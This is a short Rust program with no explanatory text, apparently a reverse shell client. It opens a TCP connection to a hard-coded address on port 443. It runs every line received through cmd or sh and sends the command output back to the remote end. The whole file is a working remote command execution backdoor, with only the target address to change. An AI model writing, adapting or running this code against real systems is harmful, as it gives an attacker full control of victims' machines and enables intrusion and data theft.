use std::io::{self, BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::Command;

const CONNECT_TO: &str = "127.0.0.1:443";

fn main() -> io::Result<()> {
    let mut stream = TcpStream::connect(CONNECT_TO)?;
    println!("Connected to server at {CONNECT_TO}");

    let mut reader = BufReader::new(stream.try_clone()?);

    loop {
        let mut command = String::new();
        let n = reader.read_line(&mut command)?;
        if n == 0 {
            println!("Server disconnected, exiting.");
            break;
        }
        let command = command.trim();
        if command.is_empty() {
            continue;
        }

        println!("Received command: {}", command);

        let output = if cfg!(target_os = "windows") {
            Command::new("cmd").args(&["/C", command]).output()
        } else {
            Command::new("sh").arg("-c").arg(command).output()
        };

        let output = match output {
            Ok(output) => output,
            Err(e) => {
                let err_msg = format!("Failed to execute command: {}\n\n", e);
                stream.write_all(err_msg.as_bytes())?;
                stream.write_all(b"\n")?;
                continue;
            }
        };

        if !output.stdout.is_empty() {
            stream.write_all(&output.stdout)?;
        }
        if !output.stderr.is_empty() {
            stream.write_all(&output.stderr)?;
        }
        stream.write_all(b"\n")?;
    }

    Ok(())
}
